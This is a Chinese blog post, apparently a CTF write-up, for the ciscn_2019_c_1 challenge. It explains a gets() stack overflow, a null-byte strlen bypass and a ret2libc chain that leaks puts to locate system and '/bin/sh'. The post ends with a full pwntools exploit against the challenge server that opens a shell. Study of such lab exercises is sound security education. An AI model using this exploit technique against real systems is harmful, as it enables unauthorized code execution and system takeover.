---
layout: post
title: 'PWN手的成长之路-14-ciscn_2019_c_1-ret2libc'
date: "2025-10-13T00:42:36Z"
---
PWN手的成长之路-14-ciscn\_2019\_c\_1-ret2libc
=======================================

![image](https://img2024.cnblogs.com/blog/3703445/202510/3703445-20251011213156881-566123849.png)

file:  
![image](https://img2024.cnblogs.com/blog/3703445/202510/3703445-20251011213245527-1823197108.png)

checksec:  
![image](https://img2024.cnblogs.com/blog/3703445/202510/3703445-20251011213255966-733232598.png)

查看 main 函数：  
![image](https://img2024.cnblogs.com/blog/3703445/202510/3703445-20251011214547059-1988519176.png)  
![image](https://img2024.cnblogs.com/blog/3703445/202510/3703445-20251011215204039-916354547.png)  
![image](https://img2024.cnblogs.com/blog/3703445/202510/3703445-20251011215416451-2088910374.png)  
再结合程序的运行，我们输入的值存到了 v4 中，当 v4=2 时，程序重新再次执行 `begin()` 函数，若输入 3，则直接退出程序，只有当我们输入 1 的时候，程序才会调用 `encrypt()` 函数。

查看 `encrypt()` 函数。`gets()` 读取输入并进入循环，通过 `strlen(s)` 获取用户输入的字节长度并对字符进行一系列异或操作。  
![image](https://img2024.cnblogs.com/blog/3703445/202510/3703445-20251011215510019-692291298.png)

发现存在 `gets()` 高危函数，猜测存在栈溢出漏洞。但是这道题没有 `system("/bin/sh")`，并且文件开启了 NX 保护，因此 ret2shellcode、ret2text基本排除了，所以只能是 ret2libc。

ret2libc 是不直接注入 shellcode （因为程序通常具有 NX 保护，栈不可知执行），而是通过利用程序自身加载的动态链接库（比如 libc.so）中的函数（如 system()、execve()等）来执行任意的代码。

但是这道题并没有给出 libc.so 文件，并且程序自身也没有 system 函数和 "/bin/sh" 字符串，所以就需要先泄露程序中的函数地址，再查询 libc 版本，并找到 system 函数和 "/bin/sh" 字符串的内存地址。

再分析 encrypt() 函数，strlen 函数是一个C库中的函数，主要用于计算以空字符 “\\0”  
为结尾的字符串长度，它会从传入的字符串开始检查每一个字符，直到遇到 “\\0” 为止，然后返回遇到的字符串个数（其中不包括 "\\0" 本身），例如：给定字符串 “hello”，strlen 函数会返回5，但是如果在字符串开头加上 "\\0"，那么此时 strlen 函数就会返回0，例如：输入字符串 "\\0hello"，strlen 函数就会返回0，因为 strlen 函数的机制就是遇到 "\\0" 就停止计数，在 encrypt() 函数的后续有说明当 v0>= strlen(s)，但是由于 strlen 返回的就是0，所以 v0>=strlen(s) 为假，条件不成立则跳出循环，即跳过了 encrypt 函数对字符串进行异或操作的逻辑，以达到 “破坏” 加密流程的目的（目的就是不让他进行加密操作）。

因为函数没有 system 、/bin/sh，所以攻击会变得较为复杂步骤：  
1、泄露libc函数地址（puts）  
2、计算其他libc函数地址（system）  
3、构造ROP链（/bin/sh）

具体流程：先泄露 puts 函数 plt，再泄露 puts 函数 got 表，栈溢出覆盖返回地址，控制流程使其跳转到 puts@plt，设置 put 参数的内存地址为 got（即泄露 puts 在内存中的实际地址），再返回 main 函数，为什么是 main 函数，因为需要返回到可以再次触发漏洞的攻击函数，方便二次攻击。

再得到puts的真实地址后，使用得到puts地址并结合ibc数据库匹配相对应的libc版本，再计算其他函数的偏移地址。

最终exp（调试了快两天才最终于2025/10/12/14:40成功）：

    from pwn import *
    from LibcSearcher import *
    
    
    #start
    r = remote('node5.buuoj.cn',28626)
    #r = process('./pwn')
    elf = ELF('./pwn')
    #libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') #ldd pwn
    context.log_level='debug'
    
    
    #params
    rdi_addr = 0x400C83
    ret_addr = 0x4006b9
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    main_addr = elf.sym['main']
    
    
    #attack
    payload = b'a'*(0x50 + 8) + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
    r.sendlineafter(b"choice",b'1')
    r.sendline(payload)
    puts_addr = u64(r.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
    #puts_addr = u64(r.recvline()[:-1].ljust(8,b'\0'))
    print(hex(puts_addr))
    
    
    #libc
    libc = LibcSearcher("puts",puts_addr)
    base_addr = puts_addr - libc.dump('puts')
    system_addr = base_addr + libc.dump('system')
    bin_sh_addr = base_addr + libc.dump('str_bin_sh')
    
    #base_addr = puts_addr - libc.symbols['puts']
    #system_addr = base_addr + libc.symbols['system']
    #bin_sh_addr = base_addr + next(libc.search(b'/bin/sh'))
    
    
    #attack2
    payload2 = b'a'*(0x50+8) + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh_addr) +p64(system_addr)
    r.sendlineafter(b'choice',b'1')
    r.recvuntil(b'encrypted')
    r.sendline(payload2)
    r.interactive()
    

参考1000x\_师傅的文章。